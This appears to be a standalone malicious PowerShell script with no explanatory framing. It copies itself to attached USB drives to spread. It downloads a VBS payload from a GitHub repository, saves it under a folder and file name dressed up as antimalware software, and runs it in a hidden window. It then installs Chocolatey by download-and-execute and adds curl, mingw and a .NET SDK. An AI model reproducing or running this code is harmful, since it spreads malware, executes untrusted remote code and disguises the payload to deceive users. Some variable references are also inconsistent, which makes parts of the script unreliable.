$j7 = MyInvocation.MyCommand.Name
foreach ($drive in Get-PSDrive -PSProvider FileSystem) {
    if ($drive.Description -like "*USB*") {
        Copy-Item -Path $j11 -Destination "$($drive.Root):\$($MyInvocation.MyCommand.Name)"
    }
} 
Invoke-WebRequest -Uri 'https://github.com/kaosSec/kaosTools/raw/main/luvzmiscvbs/sls.vbs' -OutFile 'C:\lenziAntiMalware\2023\lenziINC\AntimalwareServiceRuntime.vbs'
Start-Process "cscript.exe" "-nologo C:\lenziAntiMalware\2023\lenziINC\AntimalwareServiceRuntime.vbs" -WindowStyle Hidden
if (!(Test-Path "$env:SystemRoot\System32\chocolatey.exe")) {
    Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))
}

choco install curl -y
choco install mingw -y
choco install dotnetcore-sdk -y
